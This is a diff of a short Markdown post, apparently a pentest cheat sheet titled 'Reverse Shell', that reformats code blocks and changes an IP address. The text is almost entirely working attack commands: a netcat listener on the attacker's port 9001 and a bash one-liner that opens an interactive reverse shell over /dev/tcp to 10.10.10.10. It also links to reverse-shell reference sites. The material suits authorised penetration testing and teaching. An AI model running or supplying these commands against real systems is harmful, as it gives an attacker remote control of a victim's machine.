@@ -1,6 +1,6 @@
 ---
 title: Reverse Shell
-date: 2022-10-18T11:30:30Z
+date: 2022-10-18T11:30:30.000+00:00
 tags:
 - pentest
 categories:
@@ -31,18 +31,18 @@ cover:
 
 ---
 ## Start a listener on attacker:
-```
-nc -lp 9001
-# ip=10.10.10.10
-# port=9001
-```
+
+    nc -lp 9001
+    # ip=10.10.10.10
+    # port=9001
 
 ## Run a shell on target:
+
 * bash
-```
-bash -i >& /dev/tcp/192.168.1.10/9001 0>&1
-```
+
+    bash -i >& /dev/tcp/10.10.10.10/9001 0>&1
 
 ## References
+
 * https://www.revshells.com/
 * https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
